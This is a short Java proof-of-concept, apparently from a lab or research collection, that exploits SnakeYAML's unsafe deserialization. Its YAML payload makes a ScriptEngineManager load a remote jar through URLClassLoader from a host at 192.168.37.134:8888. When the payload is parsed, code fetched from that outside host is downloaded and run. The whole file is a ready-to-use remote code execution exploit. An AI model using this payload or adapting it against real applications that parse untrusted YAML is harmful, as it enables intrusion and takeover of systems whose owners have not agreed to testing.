package ScriptEngineManagerEXP;

import org.yaml.snakeyaml.Yaml;

import javax.script.ScriptEngineManager;


public class Exp1 {
    public static void main(String[] args) throws Exception {
        System.out.println("[+] ScriptEngineManager EXP");
        String payload =
                "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://192.168.37.134:8888/yaml-payload.jar\"]\n" +
                "  ]]\n" +
                "]";
        Yaml yaml = new Yaml();
        yaml.load(payload);
    }
}
